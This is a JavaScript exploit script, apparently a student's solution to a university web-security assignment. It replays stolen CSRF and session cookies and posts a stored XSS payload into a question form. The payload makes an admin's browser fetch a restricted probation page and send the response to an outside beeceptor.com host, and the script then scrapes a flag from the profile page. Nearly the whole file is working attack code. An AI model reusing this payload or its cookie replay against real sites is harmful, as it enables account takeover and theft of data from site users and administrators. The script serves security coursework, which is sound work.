//http://assignment-code-warriors.unimelb.life/pass_probation.php?user=fangtaidong
//Since I use my username to access the page but it show me --> Unauthorized!

//Therefore, I can use the URL of http://assignment-code-warriors.unimelb.life/question.php to firstly entry the server by Admin
//In above page the on-click event listener activate POST request: http://assignment-code-warriors.unimelb.life/ask-question.php
//Then based on the admin access to entry the URL of ~/pass_probation.php

import fetch from "node-fetch";
import { exec } from "child_process";
import util from "util";
import { FormData } from "node-fetch";

const execPro = util.promisify(exec);

// Combine and keep Cookie info (CSRF_token & session_id) login
async function cookieLogin(xss) {
  const fileName = "getCookie.py";
  await execPro("python" + " " + fileName, function (error, stdout, stderr) {
    if (error) {
      console.log("stderr", error);
    }
    if (stdout) {
      // console.log("stdout", stdout);
      let astr = stdout.split("\r\n").join("");
      //   console.log(astr);
      let [login, status, cookie] = astr.split("...");
      cookie = JSON.parse(cookie);
      // console.log(cookie);
      const { CSRF_token, PHPSESSID } = cookie;
      console.log("CSRF_token is : " + CSRF_token);
      console.log("PHPSESSID is : " + PHPSESSID);
      xss(CSRF_token, PHPSESSID);
    }
  });
}

// XSS entry point --> http://assignment-code-warriors.unimelb.life/ask-question.php
// payload with attack script

// self made JavaScript and inject as payload to backEnd request
// const data = {
//   question:
//   '<script>
//      const Http = new XMLHttpRequest();
//      Http.onreadystatechange=function(){const Http2 = new XMLHttpRequest();
//      Http2.open("GET", "https://fangtaidong.free.beeceptor.com/?response="+Http.responseText);
//      Http2.send()};const url="http://localhost/pass_probation.php?user=fangtaid";
//      Http.open("GET",url);
//      Http.send();
//   </script>',
// };

var formdata = new FormData();
// self made JavaScript and inject as payload to backEnd request
formdata.append(
  "question",
  '<script>const Http = new XMLHttpRequest();Http.onreadystatechange=function(){const Http2 = new XMLHttpRequest();Http2.open("GET", "https://fangtaidong.free.beeceptor.com/?response="+Http.responseText);Http2.send()};const url="http://localhost/pass_probation.php?user=fangtaid";Http.open("GET",url);Http.send();</script>'
);

const xss = (token, ssid) => {
  const url = "http://assignment-code-warriors.unimelb.life/ask-question.php";
  fetch(url, {
    method: "POST",
    headers: { Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}` },
    body: formdata,
  })
    .then((res) => res.text())
    .then((result) => {
      console.log(result);

      // Access back to the /profile.php to get the Flag
      fetch("http://assignment-code-warriors.unimelb.life/profile.php", {
        headers: { Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}` },
      })
        .then((data) => data.text())
        .then((res) => {
          const matchH1Text = /(?<=<h1>)(\S+)+?(?=<\/h1>)/g;
          const flagStr = res.match(matchH1Text);
          console.log(flagStr);
        });
    })
    .catch((error) => console.log("error", error));
};

cookieLogin(xss);
